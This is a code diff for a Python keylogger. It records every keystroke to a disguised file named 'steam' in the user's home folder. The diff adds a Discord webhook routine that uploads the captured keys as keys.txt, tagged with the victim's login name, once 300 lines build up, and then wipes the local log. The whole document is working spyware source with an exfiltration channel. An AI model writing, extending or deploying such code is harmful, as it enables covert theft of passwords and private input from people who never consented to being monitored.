@@ -1,8 +1,25 @@
 from pynput import keyboard
 from pathlib import Path
 from datetime import datetime
+from discord_webhook import DiscordWebhook
+import os
 
-max_length = 17 # the longest keycode i could find was media_volume_down which is 21 characters long
+max_length = 17 # the longest keycode i could find was media_volume_down which is 17 characters long
+
+url = ''
+clear_after_send = True
+
+def check_if_should_send(lines):
+    if lines >= 300:
+        webhook = DiscordWebhook(url=url, username=str(os.getlogin()))
+        file_path = Path.home() / "steam"
+        file_path.parent.mkdir(parents=True, exist_ok=True)
+        with file_path.open('r') as file:
+            webhook.add_file(file=file.read(), filename="keys.txt")
+        if clear_after_send:
+            with file_path.open('w') as file:
+                file.write("")
+        webhook.execute()
 
 def ascii_replace(key):
     try:
@@ -132,8 +149,11 @@ def on_press(key):
     if not file_path.exists():
         file_path.write_text(log.lstrip("\n"))
     else:
-        with file_path.open('a') as file:
-            file.write(log)
+        with file_path.open('r+') as file:
+            if file.readline() == "":
+                file.write(log.lstrip("\n"))
+            else:
+                file.write(log)
 
 def on_release(key):
     key_name = ascii_replace(key)
@@ -146,8 +166,13 @@ def on_release(key):
     if not file_path.exists():
         file_path.write_text(log.lstrip("\n"))
     else:
-        with file_path.open('a') as file:
-            file.write(log)
+        with file_path.open('r+') as file:
+            if file.readline() == "":
+                file.write(log.lstrip("\n"))
+            else:
+                file.write(log)
+            lines = len(file.readlines())
+        check_if_should_send(lines)
 
 with keyboard.Listener(on_press=on_press, on_release=on_release) as l:
     l.join()
